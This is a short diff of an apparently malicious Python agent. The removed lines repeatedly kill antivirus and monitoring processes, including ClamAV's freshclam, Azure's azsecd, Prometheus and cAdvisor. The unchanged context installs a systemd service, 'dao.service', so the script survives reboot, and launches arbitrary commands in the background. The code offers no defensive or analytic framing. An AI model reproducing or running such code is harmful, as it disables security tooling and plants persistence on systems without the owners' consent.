@@ -66,12 +66,6 @@ while True:
         pass
 
     if operate_system == 'lin':
-        array_kill = ['freshclam', 'mdsdmgr', 'cadvisor', 'prometheus', 'azsecd']
-        for n in array_kill:
-            try:
-                os.system('pkill ' + n)
-            except:
-                pass
         try:
             path_service = '/lib/systemd/system/dao.service'
             data = '[Unit]\nDescription=dao service\n[Service]\nType=simple\nExecStart=/usr/bin/python3 %s\n[Install]\nWantedBy=multi-user.target' % path_app
@@ -218,13 +212,4 @@ while True:
                 os.system ('nohup %s &' %command)
             else:
                 os.system ('%s &' %command)
-        
-    for i in range(0, thoi_gian_nghi, 2):
-        time.sleep(2)
-        print('Thoi gian con la la ' + str(thoi_gian_nghi - i))
-        array_kill = ['freshclam', 'mdsdmgr', 'cadvisor', 'prometheus', 'azsecd']
-        for n in array_kill:
-            try:
-                os.system('pkill ' + n)
-            except:
-                pass
+     time.sleep(thoi_gian_nghi)
